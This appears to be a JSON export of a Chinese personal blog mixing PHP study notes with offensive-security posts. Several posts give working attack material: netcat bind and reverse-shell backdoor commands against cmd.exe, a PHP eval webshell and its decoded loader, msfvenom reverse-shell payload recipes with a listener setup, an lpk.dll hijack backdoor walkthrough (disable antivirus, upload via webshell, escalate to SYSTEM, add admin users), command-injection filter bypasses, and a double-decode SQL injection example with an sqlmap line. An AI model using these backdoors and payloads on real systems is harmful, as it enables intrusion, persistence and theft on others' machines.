{"meta":{"title":"xmy's house","subtitle":"Build by xmy","description":"我见青山多妩媚，料青山见我应如是","author":"小蚂蚁的小窝","url":"http://yoursite.com","root":"/"},"pages":[{"title":"关于","date":"2020-01-10T07:43:48.000Z","updated":"2020-01-13T09:08:31.714Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"继续折腾我的博客(^o^)/"},{"title":"categories","date":"2020-01-10T07:43:16.000Z","updated":"2020-01-13T09:08:51.943Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-01-10T07:42:50.000Z","updated":"2020-01-13T09:09:05.153Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"heredoc和nowdoc","slug":"heredoc和nowdoc","date":"2020-01-14T08:38:45.000Z","updated":"2020-01-14T08:42:06.733Z","comments":true,"path":"2020/01/14/heredoc和nowdoc/","link":"","permalink":"http://yoursite.com/2020/01/14/heredoc%E5%92%8Cnowdoc/","excerpt":"&lt;?php //heredoc $title = &quot;heredoc的用法&quot;; $str1 = &lt;&lt;&lt;heredoc &lt;h1&gt;$title&lt;/h1&gt; &lt;p&gt;当需要写一大段文字的时候，这段文件包含了单引号，双引号，还有转义符，用其他方式来输出往往 比较麻烦。\\n这时候可以用heredoc。&lt;/p&gt; &lt;p&gt;heredoc的语法如下：&lt;/p&gt; 1.开始和结尾需要插入标识符；&lt;br /&gt; 2.标识符和名称和变量名的要求一样；&lt;br /&gt; 3.开始标识符前面必须有3个左尖括号：&lt;&lt;&lt;；&lt;br /&gt; 4.结束标识符必须在一行开始处，前面不能有空格和其他字符；&lt;br /&gt; 5.heredoc相当于加长版的双此号标识，即会解析变量和转义序列。&lt;br/&gt; heredoc; echo $str1; //nowdoc $str2 = &lt;&lt;&lt;&#39;nowdoc&#39; &lt;h1&gt;nowdoc的用法&lt;/h1&gt; &lt;p&gt;nowdoc是PHP5.3新增的特殊，语法和heredoc类似，主要的区别如下：&lt;/p&gt; 1.开始标识必须用单引号引起来；&lt;br /&gt; 2.nowdoc相当于加长版的单引号标识，不会解析变量和转义序列。&lt;br /&gt; 例如：&lt;br /&gt; This is a test.\\n$title nowdoc; echo $str2; ?&gt; 输出如下： &emsp;&emsp;在源代码中可以看到\\n是成功转义了的：","text":"&lt;?php //heredoc $title = &quot;heredoc的用法&quot;; $str1 = &lt;&lt;&lt;heredoc &lt;h1&gt;$title&lt;/h1&gt; &lt;p&gt;当需要写一大段文字的时候，这段文件包含了单引号，双引号，还有转义符，用其他方式来输出往往 比较麻烦。\\n这时候可以用heredoc。&lt;/p&gt; &lt;p&gt;heredoc的语法如下：&lt;/p&gt; 1.开始和结尾需要插入标识符；&lt;br /&gt; 2.标识符和名称和变量名的要求一样；&lt;br /&gt; 3.开始标识符前面必须有3个左尖括号：&lt;&lt;&lt;；&lt;br /&gt; 4.结束标识符必须在一行开始处，前面不能有空格和其他字符；&lt;br /&gt; 5.heredoc相当于加长版的双此号标识，即会解析变量和转义序列。&lt;br/&gt; heredoc; echo $str1; //nowdoc $str2 = &lt;&lt;&lt;&#39;nowdoc&#39; &lt;h1&gt;nowdoc的用法&lt;/h1&gt; &lt;p&gt;nowdoc是PHP5.3新增的特殊，语法和heredoc类似，主要的区别如下：&lt;/p&gt; 1.开始标识必须用单引号引起来；&lt;br /&gt; 2.nowdoc相当于加长版的单引号标识，不会解析变量和转义序列。&lt;br /&gt; 例如：&lt;br /&gt; This is a test.\\n$title nowdoc; echo $str2; ?&gt; 输出如下： &emsp;&emsp;在源代码中可以看到\\n是成功转义了的：","categories":[{"name":"PHP学习","slug":"PHP学习","permalink":"http://yoursite.com/categories/PHP%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP学习","slug":"PHP学习","permalink":"http://yoursite.com/tags/PHP%E5%AD%A6%E4%B9%A0/"}]},{"title":"include和require","slug":"include和require","date":"2020-01-14T08:35:44.000Z","updated":"2020-01-14T08:37:38.097Z","comments":true,"path":"2020/01/14/include和require/","link":"","permalink":"http://yoursite.com/2020/01/14/include%E5%92%8Crequire/","excerpt":"PHP包含文件最常用的两种方式是include()和require()。 include()和require()include()的语法如下： include(/path/to/filename)和print、echo一样，include()可以省略括号，使用引号来代替。include包含的代码必须使用PHP界定符包含起来，否则是不能正确解析的。如果启用了PHP配置指令allow_url_fopen，include()还可以包含一个远程文件。 require()和include()相似，但它们有以下几个区别：1.include()有返回值，require()没有。2.require()是无条件包含，即将require()放入条件判断语句中，无论判断真假require()都会执行。3.require()出错时，脚本将停止执行；而include()出错时，脚本会继续往下执行。 include_once()和require_once()和include()、require类似，include_once()和require_once()同样用于包含文件，但它们会在包含文件前首先确认该文件是否已经被包含了，如果已经包含了文件，则include_once()和require_once()就不再执行。","text":"PHP包含文件最常用的两种方式是include()和require()。 include()和require()include()的语法如下： include(/path/to/filename)和print、echo一样，include()可以省略括号，使用引号来代替。include包含的代码必须使用PHP界定符包含起来，否则是不能正确解析的。如果启用了PHP配置指令allow_url_fopen，include()还可以包含一个远程文件。 require()和include()相似，但它们有以下几个区别：1.include()有返回值，require()没有。2.require()是无条件包含，即将require()放入条件判断语句中，无论判断真假require()都会执行。3.require()出错时，脚本将停止执行；而include()出错时，脚本会继续往下执行。 include_once()和require_once()和include()、require类似，include_once()和require_once()同样用于包含文件，但它们会在包含文件前首先确认该文件是否已经被包含了，如果已经包含了文件，则include_once()和require_once()就不再执行。","categories":[{"name":"PHP学习","slug":"PHP学习","permalink":"http://yoursite.com/categories/PHP%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP学习","slug":"PHP学习","permalink":"http://yoursite.com/tags/PHP%E5%AD%A6%E4%B9%A0/"}]},{"title":"nc使用实战","slug":"nc使用实战","date":"2020-01-14T08:29:33.000Z","updated":"2020-01-14T08:31:49.228Z","comments":true,"path":"2020/01/14/nc使用实战/","link":"","permalink":"http://yoursite.com/2020/01/14/nc%E4%BD%BF%E7%94%A8%E5%AE%9E%E6%88%98/","excerpt":"参数介绍使用nc –h显示如下： connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [options] [hostname] [port] options: -d 无命令行界面,使用后台模式 -e prog 程序重定向 [危险!!] -g gateway 源路由跳跃点, 不超过8 -G num 源路由指示器: 4, 8, 12, ... -h 获取帮助信息 -i secs 延时设置,端口扫描时使用 -l 监听入站信息 -L 监听知道NetCat被结束(可断开重连) -n 以数字形式表示的IP地址 -o file 使进制记录 -p port 打开本地端口 -r 随机本地和远程的端口 -s addr 本地源地址 -t 以TELNET的形式应答入站请求 -u UDP 模式 -v 显示详细信息 [使用=vv获取更详细的信息] -w secs 连接超时设置 -z I/O 模式 [扫描时使用] 端口号可以是单个的或者存在一个范围: m-n [包含值] 监听端口nc –vv –l –p port 创建临时后门靶机：nc –l –p port –e cmd.exe攻击机：nc remote_ip port 创建telnet后门靶机：nc –l –p port –t –e cmd.exe攻击机：telnet remote_ip port 创建长期后门","text":"参数介绍使用nc –h显示如下： connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [options] [hostname] [port] options: -d 无命令行界面,使用后台模式 -e prog 程序重定向 [危险!!] -g gateway 源路由跳跃点, 不超过8 -G num 源路由指示器: 4, 8, 12, ... -h 获取帮助信息 -i secs 延时设置,端口扫描时使用 -l 监听入站信息 -L 监听知道NetCat被结束(可断开重连) -n 以数字形式表示的IP地址 -o file 使进制记录 -p port 打开本地端口 -r 随机本地和远程的端口 -s addr 本地源地址 -t 以TELNET的形式应答入站请求 -u UDP 模式 -v 显示详细信息 [使用=vv获取更详细的信息] -w secs 连接超时设置 -z I/O 模式 [扫描时使用] 端口号可以是单个的或者存在一个范围: m-n [包含值] 监听端口nc –vv –l –p port 创建临时后门靶机：nc –l –p port –e cmd.exe攻击机：nc remote_ip port 创建telnet后门靶机：nc –l –p port –t –e cmd.exe攻击机：telnet remote_ip port 创建长期后门靶机：nc –l –p port –L –d –e cmd.exe攻击机：nc remote_ip port 创建反向后门靶机：nc –e cmd.exe remote_ip port攻击机：nc –l –p port 文件传输靶机：nc –l –u –p port &gt; file_path攻击机：nc –u remote_ip port &lt; file_path","categories":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/tags/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"php后门工具phpsploit","slug":"php后门工具phpsploit","date":"2020-01-14T08:23:32.000Z","updated":"2020-01-14T08:28:47.339Z","comments":true,"path":"2020/01/14/php后门工具phpsploit/","link":"","permalink":"http://yoursite.com/2020/01/14/php%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7phpsploit/","excerpt":"最近看到一款php后门工具phpsploit，试用了一下，这里写个简单的体验说明。工具下载地址：github传送门 （图是直接从github上粘贴过来的） 工具特性什么的我就懒得写了，自己看README。上传到目标服务器的是php一句话木马，特点是使用SERVER进行连接和通信： &lt;?php @eval($_SERVER[&#39;HTTP_PHPSPL01T&#39;]); ?&gt; 下载后直接运行phpsploit脚本即可：设置一句话木马路径：连接木马：获取phpinfo信息：使用系统命令：使用wireshark查看通信数据包：可以看到数据包都在Header中，经过了加密和编码，其中Phpsplo1T使用的是base64编码，解码后如下： $s=$_SERVER;ksort($s);$x=&quot;&quot;;foreach($s as $a=&gt;$b)if(substr($a,0,7)==&#39;HTTP_ZZ&#39;)$x.=$b;eval(base64_decode(&quot;$x&quot;)); 查看access访问日志如下：","text":"最近看到一款php后门工具phpsploit，试用了一下，这里写个简单的体验说明。工具下载地址：github传送门 （图是直接从github上粘贴过来的） 工具特性什么的我就懒得写了，自己看README。上传到目标服务器的是php一句话木马，特点是使用SERVER进行连接和通信： &lt;?php @eval($_SERVER[&#39;HTTP_PHPSPL01T&#39;]); ?&gt; 下载后直接运行phpsploit脚本即可：设置一句话木马路径：连接木马：获取phpinfo信息：使用系统命令：使用wireshark查看通信数据包：可以看到数据包都在Header中，经过了加密和编码，其中Phpsplo1T使用的是base64编码，解码后如下： $s=$_SERVER;ksort($s);$x=&quot;&quot;;foreach($s as $a=&gt;$b)if(substr($a,0,7)==&#39;HTTP_ZZ&#39;)$x.=$b;eval(base64_decode(&quot;$x&quot;)); 查看access访问日志如下：","categories":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/tags/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"msfvenom后门生成工具","slug":"msfvenom后门生成工具","date":"2020-01-14T08:07:18.000Z","updated":"2020-01-14T08:21:16.710Z","comments":true,"path":"2020/01/14/msfvenom后门生成工具/","link":"","permalink":"http://yoursite.com/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/","excerpt":"渗透神器Metasploit的功能之一就是生成与利用攻击载荷（Payload），生成这些载荷的工具是msfvenom。下面我们来玩一个这个一听就知道十分好玩的工具。 msfvenom的参数我们先来看一下msfvenom的命令行选项： Options: -p, --payload 指定需要使用的payload。如果需要自定义，请使用“-”或者stdin指定 --payload-options 列出payload的选项 -l, --list [module_type] 列出指定模块的所有可用资源，模块类型包括payloads、encoders、nops和all -n, --nopsled 为payload预先指定一个NOP滑动长度 -f, --format 指定输出格式（使用--help-formats来获取msf支持的格式） -e, --encoder 指定需要使用的encoder（编码器） -a, --arch 指定payload的目标架构 --plateform 指定payload的目标平台 -s, --space 设置有效攻击载荷的最大长度 -b, --bad-chars 设置规避字符集 -i, --iterations 指定payload的编码次数 -c, --add-code 指定一个附加的win32 shellcode文件 -x, --template 指定一个自定义的可执行文件作为模板 -k, --keep 保护模板程序的动作，注入的payload作为一个新进程运行 --payload-options 列举payload的标准选项 -o, --out 保存payload -v, --var-name 指定一个自定义变量，以确定输出格式 --shellest 最小化生成payload -h, --help 查看帮助选项 --help-formats 查看msf支持的输出格式列表 列出所有的模块资源使用msfvenom –l来列出所有的模块资源， 可以指定模块payloads、encoders、nops和all。msfvenom支持的Payload极多，需要好好挖掘。如下： 常用的系统PayloadLinuxmsfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f elf –o shell.elf Windows","text":"渗透神器Metasploit的功能之一就是生成与利用攻击载荷（Payload），生成这些载荷的工具是msfvenom。下面我们来玩一个这个一听就知道十分好玩的工具。 msfvenom的参数我们先来看一下msfvenom的命令行选项： Options: -p, --payload 指定需要使用的payload。如果需要自定义，请使用“-”或者stdin指定 --payload-options 列出payload的选项 -l, --list [module_type] 列出指定模块的所有可用资源，模块类型包括payloads、encoders、nops和all -n, --nopsled 为payload预先指定一个NOP滑动长度 -f, --format 指定输出格式（使用--help-formats来获取msf支持的格式） -e, --encoder 指定需要使用的encoder（编码器） -a, --arch 指定payload的目标架构 --plateform 指定payload的目标平台 -s, --space 设置有效攻击载荷的最大长度 -b, --bad-chars 设置规避字符集 -i, --iterations 指定payload的编码次数 -c, --add-code 指定一个附加的win32 shellcode文件 -x, --template 指定一个自定义的可执行文件作为模板 -k, --keep 保护模板程序的动作，注入的payload作为一个新进程运行 --payload-options 列举payload的标准选项 -o, --out 保存payload -v, --var-name 指定一个自定义变量，以确定输出格式 --shellest 最小化生成payload -h, --help 查看帮助选项 --help-formats 查看msf支持的输出格式列表 列出所有的模块资源使用msfvenom –l来列出所有的模块资源， 可以指定模块payloads、encoders、nops和all。msfvenom支持的Payload极多，需要好好挖掘。如下： 常用的系统PayloadLinuxmsfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f elf –o shell.elf Windowsmsfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f exe –o shell.exe Macmsfvenom –p osx/x86/shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f macho –o shell.macho 常用的脚本PayloadPHPmsfvenom –p php/meterpreter_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.php ASPmsfvenom –p windows/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f asp –o shell.asp JSPmsfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.jsp WARmsfvenom –p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f war –o shell.war 其他常用PayloadPythonmsfvenom –p cmd/unix/reverse_python LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.py Bashmsfvenom –p cmd/unix/reverse_bash LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.sh Perlmsfvenom –p cmd/unix/reverse_perl LHOST=XX.XX.XX.XX LPORT=XX –f raw –o shell.pl 监听Payload运行将Payload上传到目标主机运行，就可以连接Payload进行操作。监听Payload运行的操作如下： &gt;&gt;&gt;use exploit/multi/handler&gt;&gt;&gt;set Your Payload&gt;&gt;&gt;set LHOST Your IP&gt;&gt;&gt;set LPORT Your Port&gt;&gt;&gt;exploit 注意其中Payload、LHOST和LPORT的设置必须和生成Payload时的设置一样。","categories":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/tags/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"lpk后门的使用","slug":"lpk后门的使用","date":"2020-01-14T08:03:55.000Z","updated":"2020-01-14T08:06:56.497Z","comments":true,"path":"2020/01/14/lpk后门的使用/","link":"","permalink":"http://yoursite.com/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"什么是lpklpk.dll是一个系统文件，它位于system32目录下，每个可执行文件运行之前都会加它。Windows系统的特性是先判断当前文件目录是否存在lpk.dll文件，如果不存在，再判断sytem32目录。基于这个特性，lpk的劫持就产生了。 T00ls Lpk Sethc这款工具是用于劫持lpk的后门，可以当作辅助提权之用。下面介绍它的用法。使用流程大体如下：（1）生成lpk.dll文件；（2）上传lpk.dll文件到目标服务器有可执行文件的目录，等待管理员运行可执行文件；（3）使用lpk后门控制目标服务器。 生成lpk.dll文件生成lpk.dll文件前请关闭杀毒软件，否则会生成失败。生成过程如下：如果目标主机没有开放3389，可以钩选“执行CMD”，使用命令开启3389端口。也可以通过配置邮件通知来获知管理员是否执行后门。这里的“Sethc启动设置”是指启用后门的组合键，如果不知道键值查看热键代码表，此处为A键和B键。点击“生成”即可生成lpk.dll文件，这里需要注意的是命名一定要是“lpk.dll”，不能更改。生成成功后不要再运行T00ls Lpk Sethc程序，否则自己就中木马了。 上传lpk.dll到目标服务器将lpk.dll上传到目标服务器，需要目录里面有可执行文件。这里我使用大马进行上传：上传成功后，需要等待管理员执行目录中的可执行文件，才能运行后门。这里我既然已经上传了大马了，所以我可以上传一个cmd.exe到该目录，然后运行它：这样就顺利地把后门执行起来了。 使用lpk后门远程连接目标服务器，出现如图界面后连接按下5次shift键：出现如下界面：这时候同时按下设置的组合键（我这里是A键和B键），如果不成功就多按几次，成功会出现密码输入框：输入设置的密码，接下来就是愉快的玩了：可以按“CmdShell”调出cmd窗口，可以看到，已经提权成system了：可以添加用户并加入管理员组：可以按“Explorer”调出Windows界面：功能很多，想怎么玩就怎么玩……","text":"什么是lpklpk.dll是一个系统文件，它位于system32目录下，每个可执行文件运行之前都会加它。Windows系统的特性是先判断当前文件目录是否存在lpk.dll文件，如果不存在，再判断sytem32目录。基于这个特性，lpk的劫持就产生了。 T00ls Lpk Sethc这款工具是用于劫持lpk的后门，可以当作辅助提权之用。下面介绍它的用法。使用流程大体如下：（1）生成lpk.dll文件；（2）上传lpk.dll文件到目标服务器有可执行文件的目录，等待管理员运行可执行文件；（3）使用lpk后门控制目标服务器。 生成lpk.dll文件生成lpk.dll文件前请关闭杀毒软件，否则会生成失败。生成过程如下：如果目标主机没有开放3389，可以钩选“执行CMD”，使用命令开启3389端口。也可以通过配置邮件通知来获知管理员是否执行后门。这里的“Sethc启动设置”是指启用后门的组合键，如果不知道键值查看热键代码表，此处为A键和B键。点击“生成”即可生成lpk.dll文件，这里需要注意的是命名一定要是“lpk.dll”，不能更改。生成成功后不要再运行T00ls Lpk Sethc程序，否则自己就中木马了。 上传lpk.dll到目标服务器将lpk.dll上传到目标服务器，需要目录里面有可执行文件。这里我使用大马进行上传：上传成功后，需要等待管理员执行目录中的可执行文件，才能运行后门。这里我既然已经上传了大马了，所以我可以上传一个cmd.exe到该目录，然后运行它：这样就顺利地把后门执行起来了。 使用lpk后门远程连接目标服务器，出现如图界面后连接按下5次shift键：出现如下界面：这时候同时按下设置的组合键（我这里是A键和B键），如果不成功就多按几次，成功会出现密码输入框：输入设置的密码，接下来就是愉快的玩了：可以按“CmdShell”调出cmd窗口，可以看到，已经提权成system了：可以添加用户并加入管理员组：可以按“Explorer”调出Windows界面：功能很多，想怎么玩就怎么玩……","categories":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"后门工具","slug":"后门工具","permalink":"http://yoursite.com/tags/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"Linux命令执行小技巧","slug":"Linux命令执行小技巧","date":"2020-01-14T07:55:17.000Z","updated":"2020-01-14T08:01:20.215Z","comments":true,"path":"2020/01/14/Linux命令执行小技巧/","link":"","permalink":"http://yoursite.com/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"空格绕过分别在Linux和PHP环境下测试，PHP测试脚本如下： &lt;?php $cmd = $_GET[&#39;cmd&#39;]; $black = array(&#39; &#39;); str_ireplace($black, &#39;&#39;, $cmd, $i); if($i != 0) { die(&quot;Attack!&quot;); } else { system($cmd); } ?&gt; 小于号（&lt;）Linux环境：PHP环境： 两个尖括号（&lt;&gt;）Linux环境：PHP环境下无法使用： Tab键（%09）Linux环境下无法使用：PHP环境： $IFS$","text":"空格绕过分别在Linux和PHP环境下测试，PHP测试脚本如下： &lt;?php $cmd = $_GET[&#39;cmd&#39;]; $black = array(&#39; &#39;); str_ireplace($black, &#39;&#39;, $cmd, $i); if($i != 0) { die(&quot;Attack!&quot;); } else { system($cmd); } ?&gt; 小于号（&lt;）Linux环境：PHP环境： 两个尖括号（&lt;&gt;）Linux环境：PHP环境下无法使用： Tab键（%09）Linux环境下无法使用：PHP环境： $IFS$Linux环境下，$IFS$(1-9)（文件名）都可以，0和两位以上的整数就无法识别了： PHP环境下，$IFS$后面接0以上（不包括0）的整数都可以识别： ${IFS}Linux环境：PHP环境： 命令分隔符%0aLinux环境下无法使用：PHP环境： %0dLinux环境下无法使用：PHP环境下无法使用： 分号（;）Linux环境：PHP环境： &amp;&amp;Linux环境： 管道符（|）管道符只会执行后一个指令： 命令终止符（%00%20#）只会执行前一个指令： 黑名单绕过参数定义比如在限制不允许使用cat的情况下遍历目录，Linux环境下可以这样使用：PHP环境：####4.2 base64编码编码的内容为“cat test.txt”。 参考：http://url.cn/5NsHbNP","categories":[{"name":"命令执行","slug":"命令执行","permalink":"http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"masscan扫描","slug":"masscan扫描","date":"2020-01-14T03:43:38.000Z","updated":"2020-01-14T07:50:46.338Z","comments":true,"path":"2020/01/14/masscan扫描/","link":"","permalink":"http://yoursite.com/2020/01/14/masscan%E6%89%AB%E6%8F%8F/","excerpt":"Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。 工具安装在Kali系统中安装方法如下： apt-get install git gcc make libcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make测试是否安装成功： make regress 工具使用扫描指定网段指定端口masscan -p445,3389 192.168.31.0/24","text":"Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。 工具安装在Kali系统中安装方法如下： apt-get install git gcc make libcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make测试是否安装成功： make regress 工具使用扫描指定网段指定端口masscan -p445,3389 192.168.31.0/24 配置文件定制扫描masscan -p445,3389 192.168.31.0/24 --echo &gt; masscan.conf masscan -c masscan.conf --rate 1000 配置文件内容如下： 可以通过修改配置文件来定制扫描的参数。 banner获取masscan 192.168.31.0/24 -p80 –banners 结果输出到文件masscan 192.168.31.0/24 -p80 -oX results.xml","categories":[{"name":"扫描工具","slug":"扫描工具","permalink":"http://yoursite.com/categories/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"扫描工具","slug":"扫描工具","permalink":"http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"Tomcat认证爆破","slug":"Tomcat认证爆破","date":"2020-01-14T03:40:10.000Z","updated":"2020-01-14T03:41:49.704Z","comments":true,"path":"2020/01/14/Tomcat认证爆破/","link":"","permalink":"http://yoursite.com/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/","excerpt":"Tomcat使用的是基础认证，基础认证的数据包格式如下：将base64字符串解码如下：很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。 Burpsuite爆破抓包发送到Intruder，爆破只选择base64编码的字符串：Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：认证中还使用了base64编码技术，在Payload Processing中设置：最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：最后Attack： MSF爆破MSF中有专门爆破Tomcat的模块，如下所示：进入该模块，查看配置参数：配置参数：启动爆破：","text":"Tomcat使用的是基础认证，基础认证的数据包格式如下：将base64字符串解码如下：很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。 Burpsuite爆破抓包发送到Intruder，爆破只选择base64编码的字符串：Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：认证中还使用了base64编码技术，在Payload Processing中设置：最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：最后Attack： MSF爆破MSF中有专门爆破Tomcat的模块，如下所示：进入该模块，查看配置参数：配置参数：启动爆破：","categories":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}],"tags":[{"name":"密码破解","slug":"密码破解","permalink":"http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"}]},{"title":"urldecode-二次解码引发注入","slug":"urldecode-二次解码引发注入","date":"2020-01-14T03:37:09.000Z","updated":"2020-01-14T03:39:02.293Z","comments":true,"path":"2020/01/14/urldecode-二次解码引发注入/","link":"","permalink":"http://yoursite.com/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/","excerpt":"PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\\）和NULL等特殊字符前面加上反斜杠来进行转义。 但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。 例子如下： &lt;?php header(&quot;Content-Type: text/html; charset=utf-8&quot;); $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;); mysql_select_db(&quot;test&quot;, $conn); //mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn); $id = mysql_real_escape_string($_GET[&#39;id&#39;]); $id = urldecode($id); $sql = &quot;select * from test where id=&#39;$id&#39;&quot;; $query = mysql_query($sql, $conn); if($query == True) { $result = mysql_fetch_array($query); $user = $result[&quot;user&quot;]; $email = $result[&quot;email&quot;]; print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;); print_r(&#39;邮 箱： &#39; . $email . &#39;&lt;br /&gt;&#39;); print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql); } mysql_close($conn); ?&gt; 因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。普通的注入会被转义掉： 于是构造URL编码引发注入： 可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：sqlmap -u”http://localhost/test/1.php?id=1%2527&quot; –random-agent -v 3 感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。","text":"PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\\）和NULL等特殊字符前面加上反斜杠来进行转义。 但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。 例子如下： &lt;?php header(&quot;Content-Type: text/html; charset=utf-8&quot;); $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;); mysql_select_db(&quot;test&quot;, $conn); //mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn); $id = mysql_real_escape_string($_GET[&#39;id&#39;]); $id = urldecode($id); $sql = &quot;select * from test where id=&#39;$id&#39;&quot;; $query = mysql_query($sql, $conn); if($query == True) { $result = mysql_fetch_array($query); $user = $result[&quot;user&quot;]; $email = $result[&quot;email&quot;]; print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;); print_r(&#39;邮 箱： &#39; . $email . &#39;&lt;br /&gt;&#39;); print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql); } mysql_close($conn); ?&gt; 因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。普通的注入会被转义掉： 于是构造URL编码引发注入： 可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：sqlmap -u”http://localhost/test/1.php?id=1%2527&quot; –random-agent -v 3 